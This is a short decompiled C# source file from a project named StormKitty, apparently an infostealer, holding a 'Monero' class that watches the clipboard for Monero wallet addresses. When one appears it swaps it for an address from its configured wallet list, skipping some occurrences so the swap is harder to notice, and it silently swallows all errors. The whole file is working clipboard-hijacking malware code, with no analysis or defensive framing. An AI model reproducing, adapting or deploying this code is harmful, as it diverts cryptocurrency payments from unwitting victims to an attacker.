﻿using System;
using System.Linq;
using System.Windows.Forms;

namespace StormKitty
{
	// Token: 0x0200005D RID: 93
	internal class Monero
	{
		// Token: 0x06000153 RID: 339 RVA: 0x00009F8C File Offset: 0x0000818C
		public static void GetMoneroWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletsxmr.Contains(text) && CheckXMR.Clipregex(text))
					{
						if (Monero._oppToMiss > 0)
						{
							Monero._oppToMiss--;
						}
						else
						{
							Monero._oppToMiss = Config.OppToMissDef;
							CheckXMR.SetsXMR(text);
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x040000DE RID: 222
		public static int _oppToMiss;
	}
}
